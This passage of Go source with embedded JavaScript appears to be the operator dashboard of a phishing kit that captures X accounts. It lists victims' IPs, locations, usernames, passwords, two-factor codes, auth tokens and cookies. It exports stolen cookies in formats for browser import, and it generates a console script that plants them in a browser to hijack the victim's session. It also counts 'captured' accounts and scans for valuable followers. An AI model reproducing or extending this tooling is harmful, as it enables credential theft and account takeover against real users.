	if(c.ttl) h += '<div class="det"><div class="det-label">Session TTL</div><div class="det-val"><span class="ttl-badge '+(c.ttl_status||'fresh')+'">⏰ '+c.ttl+'</span></div></div>';
	
	// FrontRun Data section
	h += '<div class="frontrun-box">';
	h += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">';
	h += '<div style="font-size:11px;font-weight:700;color:#c084fc;text-transform:uppercase;letter-spacing:.1em">🔮 FrontRun Data</div>';
	h += '<button class="scan-btn" onclick="smartScan(\''+c.username+'\')">🧠 Smart Scan</button>';
	h += '</div>';
	h += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">';
	h += '<div><div style="font-size:9px;color:var(--muted);text-transform:uppercase;margin-bottom:4px">Smart Follower</div><span style="color:var(--muted);font-size:12px">Not scanned</span></div>';
	h += '<div><div style="font-size:9px;color:var(--muted);text-transform:uppercase;margin-bottom:4px">CA Mentions</div><span style="color:var(--muted);font-size:12px">Not scanned</span></div>';
	h += '</div></div>';
	
	if(c.cookies && c.cookies.length) {
		h += '<div class="cook-section">';
		h += '<div class="cook-head"><span class="cook-title">🍪 '+c.cookies.length+' Cookies</span>';
		h += '<div style="display:flex;gap:6px;flex-wrap:wrap">';
		h += '<button class="btn btn-primary" style="padding:5px 10px;font-size:10px" onclick="cpCookiesJSON()">📋 Copy JSON</button>';
		h += '<button class="btn btn-ghost" style="padding:5px 10px;font-size:10px" onclick="dlCookiesJSON()">⬇ JSON</button>';
		h += '<button class="btn btn-ghost" style="padding:5px 10px;font-size:10px" onclick="dlCookies()">⬇ Netscape</button>';
		h += '<button class="btn btn-ghost" style="padding:5px 10px;font-size:10px" onclick="cpCmd()">Copy Cmd</button>';
		h += '</div></div>';
		h += '<div class="warn"><p>⚠️ Bound to <code>x.com</code> — Use JSON for EditThisCookie import</p></div>';
		h += '<div class="cook-box">'+JSON.stringify(c.cookies,null,2)+'</div></div>';
	}
	window._c = c;
	document.getElementById('modal-title').textContent = c.username ? '@'+c.username : 'Capture';
	document.getElementById('modal-body').innerHTML = h;
	document.getElementById('modal').classList.add('active');
}

function closeModal() { document.getElementById('modal').classList.remove('active'); }

function convertCookies(cookies) {
	return cookies.map(k => {
		var exp = k.expirationDate || k.expires;
		var isSession = !exp || exp < 0 || k.session === true;
		var cookie = {
			domain: k.domain || '.x.com',
			hostOnly: k.hostOnly !== undefined ? k.hostOnly : (k.domain && !k.domain.startsWith('.')),
			httpOnly: k.httpOnly || false,
			name: k.name,
			path: k.path || '/',
			sameSite: k.sameSite || 'lax',
			secure: k.secure || false,
			session: isSession,
			storeId: k.storeId || null,
			value: k.value
		};
		if (!isSession && exp > 0) cookie.expirationDate = exp;
		return cookie;
	});
}

function cpCookiesJSON() {
	var c = window._c; if(!c||!c.cookies) return;
	var extended = convertCookies(c.cookies);
	navigator.clipboard.writeText(JSON.stringify(extended, null, 2));
	alert('Copied! Paste in EditThisCookie or cookie editor');
}

function dlCookiesJSON() {
	var c = window._c; if(!c||!c.cookies) return;
	var extended = convertCookies(c.cookies);
	var blob = new Blob([JSON.stringify(extended, null, 2)], {type: 'application/json'});
	var a = document.createElement('a'); a.href = URL.createObjectURL(blob);
	a.download = (c.username || 'cookies') + '.json'; a.click();
}

function dlCookies() {
	var c = window._c; if(!c||!c.cookies) return;
	var t = '# Netscape HTTP Cookie File\n';
	c.cookies.forEach(k => { var d=k.domain||'.x.com'; t+=d+'\t'+(d[0]=='.'?'TRUE':'FALSE')+'\t'+(k.path||'/')+'\t'+(k.secure?'TRUE':'FALSE')+'\t'+(k.expirationDate||0)+'\t'+k.name+'\t'+k.value+'\n'; });
	var a=document.createElement('a'); a.href=URL.createObjectURL(new Blob([t])); a.download=(c.username||'cookies')+'.txt'; a.click();
}

function cpCmd() {
	var c = window._c; if(!c||!c.cookies) return;
	var s = '(async()=>{\n';
	c.cookies.forEach(k => { s+='try{await cookieStore.set({name:"'+k.name+'",value:"'+k.value+'",path:"'+(k.path||'/')+'",domain:"'+(k.domain||'.x.com')+'"'+(k.expirationDate?',expires:'+k.expirationDate:'')+'})}catch{}\n'; });
	s += 'console.log("Done");\n})();';
	navigator.clipboard.writeText(s); alert('Copied!\nGo to x.com → F12 → Console → Paste → Enter');
}

function copyCookies(id) {
	var c = sessionsData[id];
	if(c && c.cookies) {
		var extended = convertCookies(c.cookies);
		navigator.clipboard.writeText(JSON.stringify(extended, null, 2));
		alert('Cookies copied!');
	}
}

function deleteCapture() {
	var c = window._c; if(!c) return;
	if(!confirm('Delete capture for '+(c.username||c.ip)+'?')) return;
	fetch('` + a.url("/api/delete/") + `'+c.id)
		.then(r => r.json())
		.then(data => { closeModal(); location.reload(); });
}

function lookupAll() {
	fetch('` + a.url("/api/lookup-all") + `')
		.then(r => r.json())
		.then(data => {
			alert('Found ' + data.found + ' usernames');
			if(data.found > 0) location.reload();
		});
}

function clearAll() {
	fetch('` + a.url("/api/clear-all") + `')
		.then(r => r.json())
		.then(() => location.reload());
}

function smartScan(username) {
	if(!username) { alert('No username'); return; }
	fetch('` + a.url("/api/smart/") + `' + encodeURIComponent(username))
		.then(r => r.json())
		.then(data => {
			if(data.is_smart === true) alert('🧠 @' + username + ' is a SMART FOLLOWER!');
			else if(data.is_smart === false) alert('@' + username + ' is NOT a smart follower');
			else alert('Could not check @' + username);
		});
}
</script>
</body></html>`)

	w.Write([]byte(b.String()))
}

func getTTL(cookies []Cookie) (string, string) {
	now := time.Now().Unix()
	var authExp int64
	for _, c := range cookies {
		if c.Name == "auth_token" && c.Expires > 0 {
			authExp = c.Expires
			break
		}
	}
	if authExp == 0 {
		return "∞", "fresh"
	}
	ttl := authExp - now
	if ttl <= 0 {
		return "Expired", "expired"
	}
	if ttl < 86400 {
		return fmt.Sprintf("%dh", ttl/3600), "warn"
	}
	return fmt.Sprintf("%dd", ttl/86400), "fresh"
}

func countComplete(sessions []*Session) int {
	c := 0
	for _, s := range sessions {
		if s.Complete {
			c++
		}
	}
	return c
}

func (a *admin) apiSessions(w http.ResponseWriter, r *http.Request) {
	sessions := a.store.all()
	type apiSession struct {
		ID        string           `json:"id"`
		IP        string           `json:"ip"`
		Country   string           `json:"country,omitempty"`
		City      string           `json:"city,omitempty"`
		Username  string           `json:"username,omitempty"`
		Password  string           `json:"password,omitempty"`
		TwoFA     string           `json:"two_fa,omitempty"`
		AuthToken string           `json:"auth_token,omitempty"`
		CT0       string           `json:"ct0,omitempty"`
		UserID    string           `json:"user_id,omitempty"`
		Cookies   []map[string]any `json:"cookies,omitempty"`
		Complete  bool             `json:"complete"`
		StartedAt time.Time        `json:"started_at"`
		LastSeen  time.Time        `json:"last_seen"`
	}
	out := make([]apiSession, 0, len(sessions))
	for _, s := range sessions {
		out = append(out, apiSession{
			ID:        s.ID,
			IP:        s.IP,
			Country:   s.Country,
			City:      s.City,
			Username:  s.Username,
			Password:  s.Password,
			TwoFA:     s.TwoFA,
			AuthToken: s.AuthToken,
			CT0:       s.CT0,
			UserID:    s.UserID,
			Cookies:   s.cookieJSON(),
			Complete:  s.Complete,
			StartedAt: s.StartedAt,
			LastSeen:  s.LastSeen,
		})
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(out)
}

func (a *admin) apiVisitors(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(a.store.visitors())
}

func (a *admin) apiStats(w http.ResponseWriter, r *http.Request) {
	allSessions := a.store.all()
	visitors := a.store.visitors()
	captured := 0
	for _, s := range allSessions {
		if s.AuthToken != "" && len(s.CookieJar) > 0 {
			captured++
		}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]int{
		"visitors": len(visitors),
		"captured": captured,
		"sessions": len(allSessions),
	})
}

func htmlEscape(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	s = strings.ReplaceAll(s, `"`, "&quot;")
	s = strings.ReplaceAll(s, "'", "&#39;")
	return s
}

func randomToken(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return base64.RawURLEncoding.EncodeToString(b)
}
